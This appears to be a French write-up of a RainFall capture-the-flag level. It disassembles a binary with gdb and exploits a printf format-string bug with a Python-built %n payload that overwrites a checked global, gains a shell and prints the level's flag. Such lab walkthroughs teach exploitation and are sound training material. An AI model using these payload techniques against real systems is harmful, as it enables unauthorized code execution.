# **Level 4**

Pour le `level5`, c'est la meme chose que le precedant nous avons un executable, en le desassemblant dans `gdb`, on remarque qu'il utilise `printf` pour afficher l'entree de l'utilisateur sur le terminal

```
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
=> 0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
=> 0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```
On remarque en lisant le code qu'il compare le contenue de l'addresse `0x8049810` à `0x1025544` et que si les deux valeurs sont egales, il continue sinon le programme se termine.

```
   0x0804848d <+54>:    mov    0x8049810,%eax
=> 0x08048492 <+59>:    cmp    $0x1025544,%eax
```


On test le programme

```
level4@RainFall:~$ ./level4
d
d
level4@RainFall:~$ ./level4
%x
b7ff26b0
```
On a de nouveau une `format string vulnerability`

En mettant un formatteur de string en entree, celui la est traduit pour renvoyer une valeur, cela signifie que le programme est vulnerable a ce qu'on appelle les `format string attack`

> [Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)

Il faut trouver a quelle position notre addresse se trouve au moment du printf

```
level4@RainFall:~$ python -c "print'\x10\x98\x04\x08'+'%p '*20" > /var/crash/file
level4@RainFall:~$ cat /var/crash/file - | ./level4
0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049810 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```

On trouve quelle est a la 12eme position donc nous pouvons construire notre payload sachant qu'on compare notre valeur a `0x1025544` soit `16930116`

```
python -c 'print"\x10\x98\x04\x08"+"%16930112X%12$n"'
```

> On mets `%16930112X` car on ecrit deja 4 caractere au debut

On execute le tout

```
level4@RainFall:~$ python -c 'print"\x10\x98\x04\x08"+"%16930112X%12$n"' > /var/crash/file
level4@RainFall:~$ cat /var/crash/file - | ./level4

....

                        B7FF26B0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

> ### NEXT : [Level 5](/level5/resources/README.md)
